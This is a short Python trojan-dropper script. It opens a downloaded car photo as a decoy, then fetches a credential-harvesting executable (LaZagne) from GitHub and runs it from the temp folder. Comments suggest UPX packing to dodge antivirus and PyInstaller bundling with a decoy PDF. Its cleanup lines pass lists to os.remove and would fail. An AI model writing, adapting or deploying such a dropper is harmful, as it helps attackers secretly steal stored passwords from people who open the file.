#  Copyright (c) 2019. Ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import requests, subprocess, os, tempfile, sys


# For packages compiled with Pyinstaller --add-data '<PATH>;'
# file_name = sys.MEIPASS + '\sample.pdf'
# subprocess.Popen([file_name])

# Compress with UPX to reduce anti-virus detection

def download(url):
    response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as file:
        file.write(response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

# Innocent File
url_inno = 'https://pictures.topspeed.com/IMG/crop/201609/koenigsegg-agera-rsr-17_800x0w.jpg'
download(url_inno)
subprocess.Popen([url_inno.split('/')[-1]])
# Malware File
url_mal = 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4/laZagne.exe'
download(url_mal)
subprocess.call([url_mal.split('/')[-1]])

os.remove([url_inno.split('/')[-1]])
os.remove([url_mal.split('/')[-1]])
